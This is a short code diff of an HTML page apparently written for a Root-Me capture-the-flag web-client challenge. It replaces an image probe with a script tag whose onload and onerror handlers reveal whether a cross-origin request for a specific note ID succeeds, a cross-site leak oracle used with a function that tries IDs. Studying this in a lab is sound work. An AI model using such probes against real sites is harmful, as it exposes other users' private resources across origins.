@@ -18,9 +18,11 @@ function tryId() {
   img.src = TARGET + id;
 }
 const img = new Image();
-img.onload = () => console.log("IMG: 200");
-img.onerror = () => console.log("IMG: 403");
-img.src = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1382";
+const script = document.createElement('script');
+script.onload = () => console.log("SCRIPT onload – request succeeded (200)");
+script.onerror = () => console.log("SCRIPT onerror – request failed (4xx/5xx)");
+script.src = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1382";
+document.body.appendChild(script);
 </script>
 </body>
 </html>
